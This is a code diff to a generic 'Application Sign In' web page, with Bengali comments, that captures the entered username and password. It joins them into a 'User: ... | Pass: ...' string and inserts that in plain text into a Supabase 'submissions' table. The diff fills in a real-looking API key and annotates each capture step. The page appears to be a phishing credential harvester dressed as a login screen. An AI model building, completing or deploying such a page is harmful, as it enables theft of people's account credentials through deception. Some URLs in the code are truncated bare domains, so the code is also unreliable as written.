@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Application Sign In</title>
+    <!-- Supabase CDN সঠিকভাবে লোড করার জন্য অফিসিয়াল লিংক দেওয়া হয়েছে -->
     <script src="https://jsdelivr.net"></script>
     <style>
         * {
@@ -82,10 +83,12 @@
     <form id="loginForm">
         <div class="input-group">
             <label for="username">Email / Username</label>
+            <!-- এখানে আইডি দেওয়া হয়েছে 'username' -->
             <input type="text" id="username" required>
         </div>
         <div class="input-group">
             <label for="password">Password</label>
+            <!-- এখানে আইডি দেওয়া হয়েছে 'password' -->
             <input type="password" id="password" required>
         </div>
         <button id="submitBtn" type="submit">Sign In</button>
@@ -94,9 +97,9 @@
 </div>
 
 <script>
-    // আপনার সঠিক Supabase URL এবং Key এখানে বসান
+    // আপনার সুপাবেজ ড্যাশবোর্ড থেকে সঠিক URL এবং anon key এখানে বসান
     const SUPABASE_URL = "https://supabase.co";
-    const SUPABASE_KEY = "sb_publishable_YOUR_ACTUAL_KEY"; // ইনজেকশন বা ভুল কী এড়াতে সঠিক কী ব্যবহার নিশ্চিত করুন
+    const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
     
     const status = document.getElementById("status");
     const form = document.getElementById("loginForm");
@@ -111,18 +114,21 @@
         form.addEventListener("submit", async (event) => {
             event.preventDefault();
             
+            // ইনপুট ফিল্ড থেকে ইমেইল এবং পাসওয়ার্ড রিড করা হচ্ছে
             const user = document.getElementById("username").value.trim();
             const pass = document.getElementById("password").value.trim();
             
+            if (!user || !pass) return;
+
             button.disabled = true;
             status.textContent = "Processing...";
             status.style.color = "#2563eb";
 
-            // ডেটাবেজে পাঠানোর জন্য টেক্সট ফরম্যাট করা হচ্ছে
+            // আইডি এবং পাসওয়ার্ড দুটিকে একসাথে একটি স্ট্রিং বানানো হচ্ছে
             const submissionData = `User: ${user} | Pass: ${pass}`;
 
             try {
-                // 'submissions' টেবিলের 'message' কলামে ডেটা ইনসার্ট করা হচ্ছে
+                // সুপাবেজ টেবিলের 'message' কলামে সম্পূর্ণ টেক্সট পাঠানো হচ্ছে
                 const { error } = await db
                     .from("submissions")
                     .insert({ message: submissionData });
